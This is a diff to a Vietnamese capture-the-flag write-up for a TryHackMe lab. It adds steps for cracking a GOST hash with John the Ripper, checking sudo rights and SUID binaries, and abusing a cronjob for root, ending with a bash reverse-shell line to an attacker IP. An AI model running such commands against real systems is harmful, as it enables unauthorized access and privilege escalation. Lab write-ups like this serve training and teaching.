@@ -296,6 +296,11 @@ Tiếp tục truy cập và khai thác tiếp. Ta được điều hướng sang
 
 ![image](https://github.com/manhhuy2002/Writeup/assets/104350480/af322eb4-84d6-4ce2-8635-a59ba2d42490)
 
+Ngoài ra cũng có thể dùng file đã được cấp sẵn và dùng john the ripper để giải mã: john --wordlist=easypeasy.txt --format=gost hashes.txt
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/ff8b8d06-f9ca-4198-a9bd-e6b80757ee2e)
+
+
 Vậy là giải mã xong ta được pass của tấm ảnh, ta wget về và dùng steghide để phân tích: 
 >steghide extract -sf binarycodepixabay.jpg
 
@@ -317,7 +322,24 @@ Thực thi ssh:
 ![image](https://github.com/manhhuy2002/Writeup/assets/104350480/2d1f0288-a0b8-4c62-a26e-866d5c338886)
 
 
+Giờ ta cần leo thang đặc quyền lên root để có để đọc được file flag còn lại. Thử từng dạng:
+> sudo -l: không có
 
+> find / -perm -4000 -ls 2>/dev/null 
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/6a1ba4b5-9c65-45b3-bcd6-863b7c205168)
+
+Cũng không có gì.
+
+Tiếp đến là crontab: 
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/612d5a68-6f3c-4270-91d6-feb94bfa7826)
+
+É ta có thể leo thang ở đây với cronjob
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/3c31fa74-881b-4fe9-8c82-5799d59ad5c1)
+
+> bash -i >& /dev/tcp/10.8.84.31 /1234 0>&1
 
 ## [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)<a name='bnn'></a>
 
